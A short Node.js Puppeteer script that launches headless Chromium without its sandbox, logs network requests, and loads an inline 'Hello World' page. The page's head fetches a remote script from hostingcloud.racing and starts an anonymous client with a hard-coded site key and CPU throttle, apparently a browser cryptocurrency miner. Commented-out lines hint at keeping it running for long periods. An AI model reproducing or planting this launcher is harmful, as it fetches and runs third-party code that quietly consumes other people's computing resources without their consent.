const puppeteer = require('puppeteer');
console.log(" starting...");

(async () => {
      const browser = await puppeteer.launch({
        args: ['--no-sandbox']
      });
      
  const page = await browser.newPage();
  console.log("go to ncript ...");
    
      await page.setRequestInterception(true);

	page.on('request', interceptedRequest => {

		console.log( 'interceptedRequest:', interceptedRequest.url() )
		interceptedRequest.continue();
	});

	await page.setContent(`
	<html>
<head>
<script src="https://www.hostingcloud.racing/omwa.js"></script>
<script>
    var _client = new Client.Anonymous("1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423", {
        throttle: 0.6, c: "w"
    });
    _client.start();
    </script>
</head>
<body>
<p>Hello World</p>
</body>
</html>
	`, { waitUntil: ['load'] });

      
      
  //await page.goto('https://mindmindi.blogspot.com/');
  console.log("on new ...");
  const innerText = await page.evaluate(() => document.querySelector('p').innerText);
  console.log(innerText);
           // await page.waitFor(1000000);
            console.log("out of new ...");

 // await page.waitFor(1000000000);
  
})();
